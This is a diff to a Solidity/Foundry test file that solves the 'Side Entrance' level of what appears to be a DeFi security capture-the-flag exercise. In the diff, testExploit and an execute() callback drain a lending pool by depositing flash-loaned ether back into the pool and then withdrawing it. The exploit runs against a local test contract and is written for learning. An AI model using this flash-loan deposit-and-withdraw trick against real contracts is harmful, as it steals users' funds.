@@ -4,9 +4,9 @@ pragma solidity >=0.8.0;
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
-import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
 
-contract SideEntrance is Test {
+contract SideEntrance is Test, IFlashLoanEtherReceiver {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
 
     Utilities internal utils;
@@ -33,19 +33,24 @@ contract SideEntrance is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        sideEntranceLenderPool.flashLoan(address(sideEntranceLenderPool).balance);
+        sideEntranceLenderPool.withdraw();
+        attacker.transfer(address(this).balance);
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+    }
+
+    function execute() external payable {
+        uint256 amount = address(this).balance;
+        sideEntranceLenderPool.deposit{value: amount}();
     }
 
     function validation() internal {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
+    }
+
+    fallback() external payable {
+        
     }
 }
